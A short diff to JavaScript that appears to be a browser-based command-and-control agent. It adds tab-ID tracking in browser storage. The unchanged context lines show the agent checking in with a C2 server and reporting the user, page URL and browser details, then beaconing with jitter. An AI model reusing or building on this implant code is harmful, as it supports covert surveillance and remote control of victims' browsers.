@@ -186,5 +186,15 @@ function gen_sleep_time(interval, jitter){
 function get_random_int(max) {
     return Math.floor(Math.random() * Math.floor(max + 1));
 }
+
+var tabID = sessionStorage.tabID && 
+            sessionStorage.closedLastTab !== '2' ? 
+            sessionStorage.tabID : 
+            sessionStorage.tabID = Math.random();
+
+if (localStorage.getItem('tab_id') == null){
+    localStorage.setItem('tab_id',tabID);
+}
+
 C2.checkin("127.0.0.1",0,bowser.user,window.location['href'],"N/A", "N/A", get_browser());
 sleepWakeUp(C2.interval, C2.jitter);
